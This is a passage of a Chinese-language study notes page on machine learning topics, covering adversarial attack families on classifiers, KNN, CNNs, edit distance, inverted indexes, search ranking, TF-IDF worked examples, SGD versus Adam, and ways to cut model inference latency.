<li><strong>基本迭代方法（BIM, Basic Iterative Method）&#x2F;FGSM 迭代版</strong>：FGSM 的多次迭代版本。它在每一步迭代中都计算梯度并进行小幅调整，以更精确地将图像推向模型的决策边界之外</li>
</ul>
</li>
<li><strong>优点</strong>：计算效率高，生成速度快</li>
<li><strong>缺点</strong>：生成的对抗样本可能不够隐蔽，有时会留下人眼可见的痕迹</li>
</ul>
<p><strong>2. 基于优化的攻击</strong></p>
<p>这类方法将寻找对抗样本看作一个优化问题，旨在找到最小的扰动，同时确保模型分类失败</p>
<ul>
<li><strong>原理</strong>：设定一个优化目标，比如最小化扰动的大小（通常用L2或L∞范数来衡量），同时满足模型对新样本的预测结果是错误的</li>
<li><strong>代表算法</strong>：<ul>
<li><strong>Carlini &amp; Wagner（C&amp;W）攻击</strong>：这是最强大的白盒攻击之一。它通过一个精心设计的损失函数，可以生成非常小且难以被防御方法检测到的对抗样本。这种攻击的成功率非常高，但计算成本也相对较高</li>
</ul>
</li>
<li><strong>优点</strong>：生成的对抗样本扰动非常小，视觉效果极佳，难以被发现</li>
<li><strong>缺点</strong>：计算复杂，生成速度慢</li>
</ul>
<p><strong>3. 基于生成模型的攻击</strong></p>
<p>这类方法利用生成对抗网络（GAN）来生成对抗样本，而非直接基于梯度或优化</p>
<ul>
<li><strong>原理</strong>：训练一个生成器网络，它可以将随机噪声或正常样本作为输入，直接生成对抗性扰动。这个生成器被训练来欺骗一个分类器（判别器）</li>
<li><strong>优点</strong>：一旦生成器训练好，生成对抗样本的速度非常快，几乎可以实时生成</li>
<li><strong>缺点</strong>：生成器的训练过程复杂且不稳定，可能需要大量数据和计算资源</li>
</ul>
<p><strong>4. 黑盒攻击</strong></p>
<p>以上方法都是<strong>白盒攻击</strong>，即需要知道模型的内部结构和参数。而<strong>黑盒攻击</strong>则更具挑战性，它不需要知道模型的内部信息，只能通过输入和输出来寻找攻击样本</p>
<ul>
<li><strong>原理</strong>：<ul>
<li><strong>基于迁移性（Transferability）</strong>：在白盒模型（通常是公开的、结构相似的模型）上生成对抗样本，然后将这些样本用于攻击目标黑盒模型。研究表明，对抗样本在不同模型之间具有一定的<strong>迁移性</strong></li>
<li><strong>基于查询（Query-based）</strong>：通过向目标模型发送大量查询，观察其输出，并利用这些信息来估计模型的决策边界，从而生成攻击样本。这种方法通常需要大量的查询次数，但效果也更精确</li>
</ul>
</li>
<li><strong>优点</strong>：适用于无法获取模型参数的实际应用场景</li>
<li><strong>缺点</strong>：通常比白盒攻击效率低，成功率也不如白盒攻击高</li>
</ul>
<hr>
<h3 id="介绍下-KNN"><a href="#介绍下-KNN" class="headerlink" title="介绍下 KNN"></a>介绍下 KNN</h3><p><strong>KNN 的核心思想：近朱者赤，近墨者黑</strong></p>
<p>KNN 算法的原理非常直观，可以比喻成“物以类聚，人以群分”</p>
<p>想象一下，你有一张地图，上面标注了各种餐馆的类型（中餐、西餐、日料）。现在，你想在地图上给一个新的、未标注的餐馆进行分类</p>
<p>KNN 的做法是：</p>
<ol>
<li><strong>找到距离最近的邻居</strong>：首先，找到离这个新餐馆最近的 K 个已知的餐馆</li>
<li><strong>统计邻居的类别</strong>：然后，统计这 K 个最近邻居中，哪种餐馆类型出现的次数最多</li>
<li><strong>做出预测</strong>：将出现次数最多的那个类别，作为新餐馆的预测类别</li>
</ol>
<p>在这个例子中，<strong>K</strong> 就是你选择的“邻居”数量。如果 K&#x3D;3，你就会考察离新餐馆最近的 3 个餐馆的类型；如果 K&#x3D;5，你就会考察 5 个</p>
<p><strong>KNN 算法的步骤</strong></p>
<ol>
<li><strong>确定 K 值</strong>：选择一个合适的整数 K。这个 K 值是算法中唯一也是最重要的参数</li>
<li><strong>计算距离</strong>：对于每一个待分类的样本，计算它与所有训练集中样本的距离。常见的距离度量有：<ul>
<li><strong>欧氏距离（Euclidean Distance）</strong>：两点之间直线距离，最常用</li>
<li><strong>曼哈顿距离（Manhattan Distance）</strong>：两点在坐标轴上移动的距离之和</li>
</ul>
</li>
<li><strong>排序</strong>：将计算出的所有距离进行升序排序</li>
<li><strong>选择 K 个最近邻</strong>：选取距离最小的前 K 个样本</li>
<li><strong>投票或取均值</strong>：<ul>
<li><strong>分类任务</strong>：统计这 K 个样本所属类别中出现频率最高的那个类别，作为最终的预测类别</li>
<li><strong>回归任务</strong>：计算这 K 个样本的标签值的平均值，作为最终的预测值</li>
</ul>
</li>
</ol>
<p><strong>如何选择 K 值？</strong></p>
<p>K 值的选择对 KNN 算法的性能影响很大：</p>
<ul>
<li><strong>K 值太小</strong>：模型会变得非常复杂，对噪声数据和异常点非常敏感，容易导致<strong>过拟合</strong></li>
<li><strong>K 值太大</strong>：模型会变得过于简单，忽略了局部数据的特点，可能导致<strong>欠拟合</strong></li>
</ul>
<p>通常情况下，K 的值会根据数据的具体情况进行选择，常用的方法是通过交叉验证（Cross-validation）来寻找最优的 K 值</p>
<hr>
<h3 id="卷积神经网络介绍"><a href="#卷积神经网络介绍" class="headerlink" title="卷积神经网络介绍"></a>卷积神经网络介绍</h3><p><strong>CNN 是什么？</strong></p>
<p><strong>卷积神经网络</strong>是一种专门用于处理具有类似网格结构数据（如图像）的<strong>深度学习</strong>模型。它的灵感来源于人脑的<strong>视觉皮层</strong>，该皮层中的神经元只对视野中的特定区域敏感</p>
<p>简单来说，CNN 的核心思想是：<strong>与其让模型去一次性地看一张完整的图片，不如让它通过一个“小窗口”去扫描图片，逐块地提取特征，然后再把这些局部特征组合起来，形成对整个图像的理解。</strong> 这种“局部到整体”的处理方式，使得 CNN 在图像识别、目标检测等领域取得了巨大成功</p>
<p><strong>CNN 的核心构成</strong></p>
<p>一个典型的 CNN 主要由以下几个核心层组成：</p>
<p><strong>1. 卷积层</strong></p>
<p>这是 CNN 最核心的部分。它通过一个被称为<strong>卷积核</strong>（Kernel）或<strong>滤波器</strong>（Filter）的小窗口，在输入图像上进行滑动扫描</p>
<ul>
<li><strong>卷积核</strong>：这个小窗口是一个矩阵，里面装着一系列权重</li>
<li><strong>滑动</strong>：卷积核从图像的左上角开始，以一定的步长（Stride）向右和向下移动</li>
<li><strong>计算</strong>：在每一次滑动到新位置时，卷积核会与它覆盖的图像区域进行<strong>点乘</strong>（Element-wise Multiplication），然后将结果相加，得到一个新的数值。这个新的数值代表了该区域的特征</li>
<li><strong>特征图</strong>（Feature Map）：卷积核在整个图像上滑动完成后，会生成一个由这些新数值组成的矩阵，我们称之为<strong>特征图</strong>。这个特征图捕捉了图像中某种特定的局部特征，比如边缘、纹理或颜色</li>
</ul>
<p>通过使用多个不同的卷积核，我们可以提取出图像中多种多样的特征</p>
<p><strong>2. 激活层</strong></p>
<p>在卷积层计算出结果后，通常会紧跟一个<strong>激活函数</strong>，例如 <strong>ReLU</strong>（Rectified Linear Unit）</p>
<ul>
<li><strong>作用</strong>：激活函数引入了<strong>非线性</strong>。如果没有激活函数，神经网络无论有多少层，最终都只会是线性的，无法学习和表达复杂的模式</li>
<li><strong>ReLU</strong>：它的工作原理非常简单：<code>ReLU(x) = max(0, x)</code>。如果输入值大于0，它就保持不变；如果小于等于0，它就变为0。这使得模型能够更好地学习复杂的、非线性的特征</li>
</ul>
<p><strong>3. 池化层</strong></p>
<p>池化层的作用是<strong>压缩特征图</strong>，减少数据维度，从而：</p>
<ul>
<li><strong>减少参数数量</strong>：降低计算量，防止<strong>过拟合</strong></li>
<li><strong>增强特征的鲁棒性</strong>：使得模型对图像中的小幅平移、旋转或缩放变化不那么敏感</li>
</ul>
<p>最常用的池化方法是<strong>最大池化</strong>（Max Pooling）：在一个小区域内（比如2x2），只保留最大的那个值，而舍弃其他值</p>
<p><strong>4. 全连接层</strong></p>
<p>在经过多层卷积和池化之后，图像的特征被抽象和压缩。这时，我们通常会使用一个或多个<strong>全连接层</strong></p>
<ul>
<li><strong>作用</strong>：全连接层将前面所有提取到的局部特征<strong>整合</strong>起来，进行更高层次的抽象</li>
<li><strong>工作方式</strong>：全连接层中的每个神经元都与前一层的所有神经元相连，就像传统的神经网络一样。</li>
</ul>
<p><strong>5. 输出层</strong></p>
<p>全连接层的最后一层通常是<strong>输出层</strong>，它负责给出最终的预测结果</p>
<ul>
<li><strong>分类问题</strong>：如果是一个图像分类任务，输出层会使用 <strong>Softmax</strong> 激活函数来输出每个类别的概率</li>
</ul>
<p><strong>CNN 的工作流程概览</strong></p>
<ol>
<li><strong>输入</strong>：一张原始图像</li>
<li><strong>多层卷积和激活</strong>：通过多层<strong>卷积层</strong>和<strong>激活层</strong>，从图像中逐步提取出越来越抽象的特征，比如从边缘、纹理到物体的局部、再到完整的物体</li>
<li><strong>多层池化</strong>：在卷积层之间插入<strong>池化层</strong>，对特征图进行下采样，减少计算量，并增强模型对图像变化的鲁棒性</li>
<li><strong>展平（Flatten）</strong>：将最终的特征图<strong>展平</strong>成一个一维的向量</li>
<li><strong>全连接层</strong>：将这个向量输入到<strong>全连接层</strong>中，进行分类或回归</li>
<li><strong>输出</strong>：输出最终的预测结果</li>
</ol>
<hr>
<h3 id="莱文斯坦距离"><a href="#莱文斯坦距离" class="headerlink" title="莱文斯坦距离"></a>莱文斯坦距离</h3><p><strong>莱文斯坦距离是什么？</strong></p>
<p>莱文斯坦距离，又被称为<strong>编辑距离</strong>，是衡量两个字符串之间相似度的一种度量方法。它定义了将一个字符串<strong>A</strong>转换成另一个字符串<strong>B</strong>所需的最少<strong>单字符编辑操作</strong>的次数</p>
<p>这些允许的单字符编辑操作有三种：</p>
<ol>
<li><strong>插入（Insertion）</strong>：在字符串中插入一个字符</li>
<li><strong>删除（Deletion）</strong>：从字符串中删除一个字符</li>
<li><strong>替换（Substitution）</strong>：将字符串中的一个字符替换成另一个字符</li>
</ol>
<p>莱文斯坦距离越小，说明两个字符串越相似。反之，距离越大，相似度越低</p>
<p><strong>一个简单的例子</strong></p>
<p>让我们用一个例子来直观地理解它</p>
<p>计算字符串 <strong>“kitten”</strong> 和 <strong>“sitting”</strong> 的莱文斯坦距离</p>
<ol>
<li><strong>“kitten”</strong> -&gt; <strong>“sitten”</strong>（将 ‘k’ <strong>替换</strong>为 ‘s’）</li>
<li><strong>“sitten”</strong> -&gt; <strong>“sittin”</strong>（将 ‘e’ <strong>替换</strong>为 ‘i’）</li>
<li><strong>“sittin”</strong> -&gt; <strong>“sitting”</strong>（在末尾<strong>插入</strong> ‘g’）</li>
</ol>
<p>总共需要 <strong>3</strong> 次编辑操作，所以 “kitten” 和 “sitting” 的莱文斯坦距离是 <strong>3</strong></p>
<p><strong>如何计算？</strong></p>
<p>莱文斯坦距离通常使用<strong>动态规划</strong>（Dynamic Programming）算法来计算。这个方法的核心思想是构建一个二维矩阵，其中 <code>dp[i][j]</code> 存储的是字符串 A 的前 <code>i</code> 个字符与字符串 B 的前 <code>j</code> 个字符之间的编辑距离</p>
<p>矩阵的填充规则如下：</p>
<ul>
<li><p><strong>初始化</strong>：</p>
<ul>
<li><code>dp[i][0]</code> 等于 <code>i</code>（将 A 的前 <code>i</code> 个字符全部删除）</li>
<li><code>dp[0][j]</code> 等于 <code>j</code>（将 B 的前 <code>j</code> 个字符全部插入）</li>
</ul>
</li>
<li><p><strong>递推关系</strong>：对于矩阵中的每一个 <code>(i, j)</code>，我们比较 A 的第 <code>i</code> 个字符和 B 的第 <code>j</code> 个字符：</p>
<ul>
<li>如果 <code>A[i-1]</code> 等于 <code>B[j-1]</code>，说明这两个字符相同，不需要编辑。此时 <code>dp[i][j] = dp[i-1][j-1]</code></li>
<li>如果 <code>A[i-1]</code> 不等于 <code>B[j-1]</code>，我们需要考虑三种操作的最小代价：<ul>
<li><strong>插入</strong>：<code>dp[i][j-1] + 1</code></li>
<li><strong>删除</strong>：<code>dp[i-1][j] + 1</code></li>
<li><strong>替换</strong>：<code>dp[i-1][j-1] + 1</code></li>
</ul>
</li>
</ul>
<p>最终，<code>dp[i][j]</code> 取这三个值的最小值：<code>dp[i][j] = min(dp[i][j-1] + 1, dp[i-1][j] + 1, dp[i-1][j-1] + 1)</code></p>
</li>
</ul>
<p>最终，矩阵右下角的 <code>dp[len(A)][len(B)]</code> 就是两个字符串的莱文斯坦距离</p>
<hr>
<h3 id="倒排索引"><a href="#倒排索引" class="headerlink" title="倒排索引"></a>倒排索引</h3><p><strong>倒排索引是什么？</strong></p>
<p>倒排索引是一种非常重要且应用广泛的数据结构，它是现代<strong>搜索引擎</strong>的核心技术之一</p>
<p>它的基本思想是：<strong>将文档中的每个词语与包含该词语的文档列表关联起来</strong></p>
<p>你可以把它想象成一本书后面的<strong>索引</strong>。在这本书的索引里，你不会看到“第10页有…，第11页有…”，而是会看到“<strong>人工智能</strong>：第10页、第11页、第25页…”</p>
<p>倒排索引就是这样一种结构，它将词语（或术语）作为<strong>键</strong>（Key），将包含该词语的文档列表作为<strong>值</strong>（Value）。这种“词语到文档”的映射关系与传统的“文档到词语”的映射（即正向索引）正好相反，因此得名“倒排”</p>
<p><strong>倒排索引的核心构成</strong></p>
<p>一个典型的倒排索引通常包含两个部分：</p>
<p><strong>1. 词典</strong></p>
<ul>
<li><strong>作用</strong>：存储所有文档中出现过的所有<strong>不重复</strong>的词语</li>
<li><strong>结构</strong>：通常是一个经过排序的列表或哈希表。它能让你快速定位到某个词语在倒排列表中的位置。</li>
</ul>
<p><strong>2. 倒排列表</strong></p>
<ul>
<li><strong>作用</strong>：存储每个词语出现的<strong>文档ID</strong>列表，以及该词语在文档中的<strong>位置</strong>、<strong>频率</strong>等信息</li>
<li><strong>结构</strong>：与词典中的每个词语相对应，包含以下信息：<ul>
<li><strong>文档ID（Document ID）</strong>：包含该词语的文档的唯一标识符</li>
<li><strong>词频（Term Frequency）</strong>：该词语在特定文档中出现的次数</li>
<li><strong>位置（Position）</strong>：该词语在文档中出现的位置（如第几个词）。这对于处理短语查询（比如”人工智能”）非常重要</li>
</ul>
</li>
</ul>
<p><strong>倒排索引的工作原理</strong></p>
<p>让我们通过一个简单的例子来理解它的工作流程：</p>
<p>假设我们有三个文档：</p>
<ul>
<li><strong>文档1</strong>：<code>人工智能是未来。</code></li>
<li><strong>文档2</strong>：<code>学习人工智能。</code></li>
<li><strong>文档3</strong>：<code>未来是美好的。</code></li>
</ul>
<p><strong>1. 分词（Tokenization）</strong></p>
<p>首先，对每个文档进行分词，得到词语列表</p>
<ul>
<li><strong>文档1</strong>：<code>[“人工智能”, “是”, “未来”]</code></li>
<li><strong>文档2</strong>：<code>[“学习”, “人工智能”]</code></li>
<li><strong>文档3</strong>：<code>[“未来”, “是”, “美好”]</code></li>
</ul>
<p><strong>2. 构建倒排索引</strong></p>
<p>然后，我们构建倒排索引，将每个词语与包含它的文档关联起来</p>
<table>
<thead>
<tr>
<th>词语</th>
<th>倒排列表（文档ID，词频，位置）</th>
</tr>
</thead>
<tbody><tr>
<td>人工智能</td>
<td>[ (文档1, tf:1, pos:0), (文档2, tf:1, pos:1) ]</td>
</tr>
<tr>
<td>是</td>
<td>[ (文档1, tf:1, pos:1), (文档3, tf:1, pos:1) ]</td>
</tr>
<tr>
<td>未来</td>
<td>[ (文档1, tf:1, pos:2), (文档3, tf:1, pos:0) ]</td>
</tr>
<tr>
<td>学习</td>
<td>[ (文档2, tf:1, pos:0) ]</td>
</tr>
<tr>
<td>美好</td>
<td>[ (文档3, tf:1, pos:2) ]</td>
</tr>
</tbody></table>
<p><strong>3. 查询过程</strong></p>
<p>现在，如果你搜索关键词“<strong>人工智能</strong>”，搜索引擎会怎么做呢？</p>
<ol>
<li><strong>查询词典</strong>：它会直接在倒排词典中找到“人工智能”这个词</li>
<li><strong>获取倒排列表</strong>：获取与“人工智能”对应的倒排列表，即 <code>[ (文档1, ...), (文档2, ...) ]</code></li>
<li><strong>返回结果</strong>：根据这个列表，搜索引擎可以立即知道文档1和文档2包含了“人工智能”这个词，并迅速将它们作为搜索结果返回</li>
</ol>
<p>如果你搜索“<strong>人工智能 未来</strong>”，搜索引擎会：</p>
<ol>
<li>分别找到“人工智能”和“未来”的倒排列表</li>
<li>对这两个列表进行<strong>求交集</strong>（Intersection），找到同时包含这两个词的文档ID</li>
<li>最终得到结果是<strong>文档1</strong></li>
</ol>
<hr>
<h3 id="搜索引擎的算法有哪些"><a href="#搜索引擎的算法有哪些" class="headerlink" title="搜索引擎的算法有哪些"></a>搜索引擎的算法有哪些</h3><p><strong>1. 爬虫与数据抓取</strong></p>
<p>这是整个搜索引擎系统的起点。爬虫是一个自动化程序，它会模拟人浏览网页的行为，从一个起始页面开始，沿着页面中的链接不断地爬取新的网页，并将它们存储到搜索引擎的数据库中</p>
<ul>
<li><strong>工作原理</strong>：爬虫会周期性地访问网站，检查是否有新的内容或更新。为了提高效率，它会遵循一些规则，比如不爬取某些禁止访问的页面（通过 <code>robots.txt</code> 文件指定），或者优先抓取热门网站和经常更新的页面</li>
</ul>
<p><strong>2. 索引</strong></p>
<p>抓取到的网页原始数据是无法直接用于搜索的。索引过程就是将这些网页数据进行<strong>预处理</strong>和<strong>结构化</strong>，使其能够被快速检索</p>
<ul>
<li><strong>分词（Tokenization）</strong>：将网页内容分解成一个个独立的词语（或称为“词项”）。例如，将句子“深度学习算法”分解为“深度”、“学习”、“算法”</li>
<li><strong>倒排索引（Inverted Index）</strong>：这是索引的核心。它将词语与包含该词语的文档列表进行关联。这种结构使得搜索引擎可以迅速找到包含特定关键词的所有文档，而不是遍历所有文档</li>
</ul>
<p><strong>3. 排名算法</strong></p>
<p>这是搜索引擎算法中最核心、最复杂的部分，它决定了哪些搜索结果会排在前面。排名算法的目标是根据用户查询，评估每个网页的**相关性（Relevance）**和**重要性（Importance）**，并进行排序</p>
<p><strong>a. 文本相关性算法</strong></p>
<p>这些算法主要评估查询词和网页内容之间的匹配程度</p>
<ul>
<li><strong>TF-IDF（词频-逆文档频率）</strong>：这是一种经典的相关性算法<ul>
<li><strong>TF（Term Frequency）</strong>：一个词在文档中出现的频率。如果一个词出现得越多，说明该文档与这个词越相关</li>
<li><strong>IDF（Inverse Document Frequency）</strong>：一个词在所有文档中出现的频率。如果一个词在越少文档中出现，说明它越能区分文档，其权重越高</li>
<li>TF-IDF 的核心思想是：一个词在一个文档中出现频率高，但在所有文档中出现频率低，那么这个词对该文档的代表性就越强。</li>
</ul>
</li>
</ul>
<p><strong>b. 网页重要性算法</strong></p>
<p>这些算法旨在评估网页的整体权威性</p>
<ul>
<li><strong>PageRank</strong>：这是 Google 早期最著名的排名算法。它的核心思想是：如果一个网页被越多重要的网页链接，那么它本身也越重要。可以把链接看作是一种“投票”。PageRank 会递归地计算每个网页的“重要性得分”，并将其作为排名的一个重要指标。</li>
</ul>
<p><strong>c. 用户行为算法</strong></p>
<p>现代搜索引擎还会考虑用户的行为数据来优化排名</p>
<ul>
<li><strong>点击率（CTR）</strong>：如果一个网页在搜索结果中的点击率很高，说明用户认为它很相关，这会提升它的排名</li>
<li><strong>停留时间</strong>：用户在点击某个搜索结果后，在该页面停留的时间长短。如果用户很快就返回搜索结果页，可能说明这个页面不是他们想要的，这会降低它的排名</li>
</ul>
<p><strong>4. 知识图谱与语义理解</strong></p>
<p>现代搜索引擎已经超越了简单的关键词匹配。它们能够理解查询背后的<strong>意图</strong>和<strong>实体</strong></p>
<ul>
<li><strong>知识图谱（Knowledge Graph）</strong>：它将实体（如“巴黎”、“埃菲尔铁塔”）及其相互关系组织成一个巨大的网络。当用户搜索“埃菲尔铁塔高度”时，搜索引擎可以直接从知识图谱中返回答案，而无需跳转到网页</li>
<li><strong>自然语言处理（NLP）</strong>：搜索引擎利用 NLP 技术来理解查询的语义。例如，它能理解“苹果”这个词在“苹果公司”和“苹果手机”中的不同含义，从而给出更精准的结果</li>
</ul>
<hr>
<h3 id="了解-TF-IDF-文档匹配算法吗"><a href="#了解-TF-IDF-文档匹配算法吗" class="headerlink" title="了解 TF-IDF 文档匹配算法吗"></a>了解 TF-IDF 文档匹配算法吗</h3><p><strong>TF-IDF 的核心思想</strong></p>
<p>TF-IDF 的核心思想可以用一句话概括：<strong>一个词语在一个文档中出现得越多，并且在所有文档中出现得越少，那么它对于该文档的区分度就越高，也就越重要</strong></p>
<p>这个算法将一个词语的重要性分为两个部分来计算：</p>
<p><strong>1. 词频</strong></p>
<p><strong>TF</strong> 表示一个词语在一个文档中出现的频率。计算公式通常是：</p>
<p>TF(t,d)&#x3D;文档 d 中所有词语的总数词语 t 在文档 d 中出现的次数</p>
<ul>
<li><strong>作用</strong>：衡量一个词语在<strong>当前文档</strong>中的重要性。一个词在文档中出现得越多，TF 值就越大，表明该词与该文档的相关性可能更高。</li>
</ul>
<p><strong>2. 逆文档频率（IDF, Inverse Document Frequency）</strong></p>
<p><strong>IDF</strong> 表示一个词语在整个文档集中出现的稀有程度。计算公式通常是：</p>
<p>IDF(t,D)&#x3D;log(包含词语 t 的文档数+1文档总数 N)</p>
<p>这里的 +1 是为了防止分母为零，以避免对未出现的词语产生错误计算。</p>
<ul>
<li><strong>作用</strong>：衡量一个词语在<strong>所有文档</strong>中的重要性。<ul>
<li>如果一个词语在很多文档中都出现，说明它是一个<strong>通用词</strong>（如“的”、“是”、“了”），它的 IDF 值就会很低，接近于0。</li>
<li>如果一个词语只在很少的文档中出现，说明它是一个<strong>稀有词</strong>，它的 IDF 值就会很高。</li>
</ul>
</li>
</ul>
<p><strong>TF-IDF 的计算</strong></p>
<p>最终，一个词语在一个文档中的 <strong>TF-IDF 值</strong>是 <strong>TF</strong> 和 <strong>IDF</strong> 的乘积：</p>
<p>TF−IDF(t,d,D)&#x3D;TF(t,d)×IDF(t,D)</p>
<p><strong>举个例子</strong></p>
<p>假设我们有一个包含3个文档的文档集：</p>
<ul>
<li><strong>文档1</strong>：<code>“我 喜欢 吃 苹果。苹果 很甜。”</code></li>
<li><strong>文档2</strong>：<code>“我 喜欢 吃 香蕉。”</code></li>
<li><strong>文档3</strong>：<code>“我 喜欢 玩 电脑。”</code></li>
</ul>
<p>现在，我们来计算“<strong>苹果</strong>”这个词在<strong>文档1</strong>中的 TF-IDF 值</p>
<ol>
<li><strong>计算 TF (苹果, 文档1)</strong><ul>
<li>“苹果”在文档1中出现了2次</li>
<li>文档1中总共有7个词语</li>
<li>TF&#x3D;72≈0.286</li>
</ul>
</li>
<li><strong>计算 IDF (苹果, 所有文档)</strong><ul>
<li>文档总数 N&#x3D;3</li>
<li>“苹果”只出现在文档1中，所以包含“苹果”的文档数是1</li>
<li>IDF&#x3D;log(1+13)&#x3D;log(1.5)≈0.176</li>
</ul>
</li>
<li><strong>计算 TF-IDF (苹果, 文档1)</strong><ul>
<li>TF−IDF&#x3D;0.286×0.176≈0.0503</li>
</ul>
</li>
</ol>
<p>如果再计算“<strong>我</strong>”这个词在<strong>文档1</strong>中的 TF-IDF 值：</p>
<ol>
<li><strong>计算 TF (我, 文档1)</strong><ul>
<li>“我”出现了1次</li>
<li>TF&#x3D;71≈0.143</li>
</ul>
</li>
<li><strong>计算 IDF (我, 所有文档)</strong><ul>
<li>文档总数 N&#x3D;3</li>
<li>“我”出现在了所有3个文档中</li>
<li>IDF&#x3D;log(3+13)&#x3D;log(0.75)≈−0.125</li>
</ul>
</li>
<li><strong>计算 TF-IDF (我, 文档1)</strong><ul>
<li>TF−IDF&#x3D;0.143×(−0.125)≈−0.0178</li>
</ul>
</li>
</ol>
<p>这个负值表明“我”这个词的通用性太高，几乎不具备区分度。而“苹果”这个词的 TF-IDF 值更高，因为它在文档1中频繁出现，但在整个文档集中又相对稀有，因此更能代表文档 1 的主题</p>
<hr>
<h3 id="SGD-和-Adam-的区别"><a href="#SGD-和-Adam-的区别" class="headerlink" title="SGD 和 Adam 的区别"></a>SGD 和 Adam 的区别</h3><p><strong>什么是优化算法？</strong></p>
<p>在深入了解这两种算法之前，我们先明确一下什么是<strong>优化算法</strong></p>
<p>在训练神经网络时，我们的目标是最小化<strong>损失函数</strong>（Loss Function）。损失函数衡量了模型预测结果与真实值之间的差距。优化算法就是一种方法，它告诉我们<strong>如何调整模型的参数</strong>（即权重和偏置），以使损失函数的值越来越小，从而让模型变得越来越准确</p>
<p>可以把优化算法想象成在下山时，如何选择每一步的方向和步长，才能最快地到达山谷（即损失函数的最小值）</p>
<p><strong>1. 随机梯度下降（SGD, Stochastic Gradient Descent）</strong></p>
<p><strong>基本原理</strong></p>
<p><strong>SGD</strong> 是最基础、最原始的优化算法。它的“随机”体现在：在每一次迭代中，它<strong>随机选择一个样本</strong>（或一小批样本，即 <strong>Mini-Batch SGD</strong>），然后计算这一个（或一小批）样本的损失，并根据这个损失来更新模型的参数</p>
<p>这与传统的<strong>批量梯度下降</strong>（Batch Gradient Descent）不同，后者会计算所有训练样本的损失来更新一次参数。</p>
<p><strong>优点</strong></p>
<ul>
<li><strong>计算效率高</strong>：由于每次只处理一小批样本，计算量大大减少，尤其是在面对海量数据时</li>
<li><strong>跳出局部最优</strong>：SGD 的“随机性”使得它有机会跳出一些浅的局部最优解，找到更好的全局最优解。</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li><strong>收敛速度慢且不稳定</strong>：由于每次的梯度只代表了一小部分数据，更新方向可能会非常“抖动”和不稳定，导致损失函数在下降时像锯齿一样波动</li>
<li><strong>需要手动设置学习率</strong>：如果学习率（步长）太大，可能无法收敛；如果太小，收敛速度会非常慢。而且，整个训练过程都使用同一个固定的学习率，无法根据参数的重要性进行调整</li>
</ul>
<p><strong>2. Adam（Adaptive Moment Estimation）</strong></p>
<p><strong>基本原理</strong></p>
<p><strong>Adam</strong> 是一种<strong>自适应学习率</strong>的优化算法。它结合了<strong>RMSprop</strong> 和 <strong>Adagrad</strong> 的优点，是目前最常用、效果最好的优化器之一。它的核心思想是：<strong>为每个参数都动态地调整学习率</strong></p>
<p>Adam 主要通过计算梯度的<strong>一阶矩</strong>（均值）和<strong>二阶矩</strong>（方差）的指数移动平均值来调整学习率</p>
<ul>
<li><strong>一阶矩（mt）</strong>：可以看作是梯度的加权平均，它决定了更新方向</li>
<li><strong>二阶矩（vt）</strong>：可以看作是梯度平方的加权平均，它决定了更新的步长大小</li>
</ul>
<p>Adam 会根据这些动态计算的矩，为不同的参数提供不同的学习率。对于梯度大的参数，它会减小学习率；对于梯度小的参数，它会增加学习率</p>
<p><strong>优点</strong></p>
<ul>
<li><strong>收敛速度快</strong>：由于它能够自适应地调整学习率，Adam 在多数情况下比 SGD 收敛得更快</li>
<li><strong>无需手动调优学习率</strong>：大多数情况下，使用 Adam 的默认参数就能取得很好的效果，大大简化了调参过程</li>
<li><strong>能处理稀疏梯度</strong>：对于有稀疏梯度的任务（如自然语言处理），Adam 表现出色</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li><strong>可能会收敛到局部最优</strong>：一些研究表明，Adam 在某些特定场景下可能会收敛到比 SGD 差的局部最优解，这是因为它自适应的学习率可能导致它在训练后期学习率过低，无法跳出局部最优</li>
</ul>
<table>
<thead>
<tr>
<th>特性</th>
<th>SGD</th>
<th>Adam</th>
</tr>
</thead>
<tbody><tr>
<td>学习率</td>
<td>固定，需要手动设置</td>
<td>自适应，为每个参数动态调整</td>
</tr>
<tr>
<td>更新方式</td>
<td>根据单个样本或 mini-batch 的梯度直接更新</td>
<td>结合一阶矩和二阶矩，动态调整更新方向和步长</td>
</tr>
<tr>
<td>收敛性</td>
<td>波动较大，可能收敛到全局最优</td>
<td>平稳且快速收敛，但可能陷入较差的局部最优</td>
</tr>
<tr>
<td>适用性</td>
<td>在大型模型或特定任务上需要精细调参，效果可能更好</td>
<td>绝大多数场景下都能快速获得不错的效果，易于使用</td>
</tr>
<tr>
<td>调参难度</td>
<td>高，需要仔细调整学习率</td>
<td>低，默认参数通常表现良好</td>
</tr>
</tbody></table>
<hr>
<h3 id="如何缩减模型的检测时延"><a href="#如何缩减模型的检测时延" class="headerlink" title="如何缩减模型的检测时延"></a>如何缩减模型的检测时延</h3><p><strong>1. 模型量化</strong></p>
<p><strong>模型量化</strong>是减少模型大小和计算量最直接有效的方法。它将模型参数从浮点数（如32位浮点数）转换为低精度的数据类型（如8位整数）</p>
<ul>
<li><strong>原理</strong>：浮点运算比整数运算耗时更多。通过将权重和激活值量化为整数，可以利用专门的整数计算单元，从而大幅提高推理速度</li>
<li><strong>优点</strong>：<ul>
<li>显著减少模型大小，便于部署在移动设备和边缘设备上</li>
<li>大幅降低计算时延，尤其是对于 CPU 和 DSP 等处理器</li>
</ul>
</li>
<li><strong>缺点</strong>：可能会损失一定的模型精度。不过，在许多应用中，这种精度损失是可以接受的。</li>
</ul>
<p><strong>2. 模型剪枝</strong></p>
<p><strong>模型剪枝</strong>是移除模型中不重要或冗余的连接和神经元，以减小模型体积和计算量</p>
<ul>
<li><strong>原理</strong>：在训练好的模型中，很多权重值可能接近于零，对模型的贡献很小。剪枝就是识别并移除这些不重要的权重或神经元</li>
<li><strong>方法</strong>：<ul>
<li><strong>非结构化剪枝</strong>：移除单个权重，但会使得模型变得稀疏，需要特殊的硬件或库才能加速</li>
<li><strong>结构化剪枝</strong>：移除整个神经元、通道或层，生成的模型结构更紧凑，可以直接在现有硬件上加速</li>
</ul>
</li>
<li><strong>优点</strong>：减少模型大小和计算量，提高推理速度，同时可以保持较高的精度</li>
</ul>
<p><strong>3. 知识蒸馏</strong></p>
<p><strong>知识蒸馏</strong>是一种训练技巧，它利用一个已经训练好的大型模型（<strong>教师模型</strong>）来指导一个较小的模型（<strong>学生模型</strong>）的学习过程</p>
<ul>
<li><strong>原理</strong>：学生模型不仅学习真实标签，还学习教师模型的软目标（Soft Labels，即教师模型输出的概率分布）。这种方法让学生模型在学习过程中获得额外的“知识”，从而在模型大小显著减小的情况下，也能达到接近教师模型的性能</li>
